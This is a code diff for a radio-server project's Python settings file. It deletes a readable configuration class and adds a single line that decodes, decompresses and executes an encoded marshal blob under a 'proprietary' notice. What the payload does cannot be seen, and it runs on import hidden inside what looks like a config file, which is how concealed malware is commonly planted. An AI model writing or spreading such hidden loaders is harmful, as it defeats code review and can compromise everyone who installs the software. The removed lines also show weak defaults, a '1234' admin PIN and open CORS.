@@ -1,31 +1,5 @@
-from pydantic_settings import BaseSettings
-from typing import List
-import os
-
-class Settings(BaseSettings):
-    PROJECT_NAME: str = "NinjaRadio Server"
-    VERSION: str = "1.0.0"
-    API_V1_STR: str = "/api"
-    
-    # Server & DMR Identities
-    SERVER_CALLSIGN: str = "N1NJA"
-    SERVER_DMR_ID: int = 5109999
-    DEFAULT_TALKGROUP: int = 510
-    
-    # Network Ports
-    DMR_MASTER_PORT: int = 62031
-    HBLINK_PEER_PORT: int = 62030
-    USRP_AUDIO_PORT: int = 32345
-    ADMIN_PIN: str = "1234"
-    
-    # Database
-    DATABASE_URL: str = "sqlite+aiosqlite:///./ninjaradio.db"
-    
-    # CORS
-    CORS_ORIGINS: List[str] = ["*"]
-    
-    class Config:
-        case_sensitive = True
-        env_file = ".env"
-
-settings = Settings()
+# -*- coding: utf-8 -*-
+# NinjaRadio Proprietary Architecture - All Rights Reserved
+# Unauthorized copying, reverse engineering or distribution is strictly prohibited.
+import zlib, marshal, base64
+exec(marshal.loads(zlib.decompress(base64.b85decode('c-n1L&2Jh<6rbH4K5Sz!#$SB6#i551OE_+Fs4U0Q+E8~LSkNw5>Rv|FyRo*yi?h426sxK@^gyK^I8<u?0!vl?8MvW2RqCmyk|u}Bhp2A`LyS`9@tgO1@6DSxPfz<Ny7vp*?Qc&3enloSg%-LH3_)PJ*b*-!L*lyB!Uh)6F*5Ow$P8G*jfBu^X_CkYh{y`ufcAQt+z6VIj`G337|9DXa@h1N-SU0gIro6$vhDfm+5LL(q@F)`Jr*(q6B%Ly>M|q?TLDwt2ahQkLC!E|0VBj&kh72x<}A$FoH1w31Doe;!C2rd!r7t`;VjBo%vj`XiL<y7<!qU=gc0L8S2$ZWmN;AEZ2ep?;?}Z-lhbE_Z-e=Gzmm|e)Qt$85vQF=m}%%thK48YxQ?r~^IcPGnsz&@Tke(R(nw9Ko|KO2M3pP0>%eZ|QQ;8{ot89RsjAm_r+I19dAX*L(_Nz1H5yQN)f1V<^pXZa<VY@;b>&#K|Nggv=;EEVSkZ`5wBHK|(Ri`+mE0)TNnI{KJJza=nqB<|>@gNpk@Y&n*Q#3GR+)9_>%+35J|nf##Qe<<EV!X-H6k~PN|jqF-u>e76FMgsD~d{Lih7;%UbJlA+HTtIv9`Cfvs2h{*n?g6;DY%rjTGg&d?@QB($LCOct|5hRZS;VO*vLneP&36$&jqg3<(<%Q#3FiI(!?Ow6<{6cAnek^=n+PoGUdSpkYFs=7mKFohRg?ZN6+VJwnKfm(A9lCwd0MN<7Q)Y~Q}JXc*3t=XT5b9ld3j-$wR7Jm7!^$CtS4;7Y^a+W_cH*D$%+jSdsZZkR3i6L7j&05!kjvPhTBj+<f-0-%!TyEH~f({b8<)3@7>M~E9{{y7E<3?e+zc6@h{(I|r$gCz#b3=#}h8Q{s4?j{3X!KVy@6JXy0FDl$G8w%gp?v#7EKHdfy;O$`|)j96!eVhUr;M8y}(>du$eVhRq;LIq9GPzE*2N4fI2Kd1+ne9}1kNY?aGQip4CMc^tZ)#viw#G*$A(^c{Ug@3nG3;9dyfsW`X9HH#9i<B?(jWtzh7`$zah*>=2KXshvbo<Zuzl9^e#!SSxN-xW8(}e!8ljKj4TE?8;~2M!H7FmV@yl0c)A8*yn2hmsx$F~2gZ`^aV7$vzY<oPOhNnTZJ--d_kEiay{rqm8y$gVmBnZL~J?ziQ5UuxTWr*fFe2wsi0A+p*-S6M9?cE3K6BJqLe)-eh&wHIPTfChA05frf_W'))))
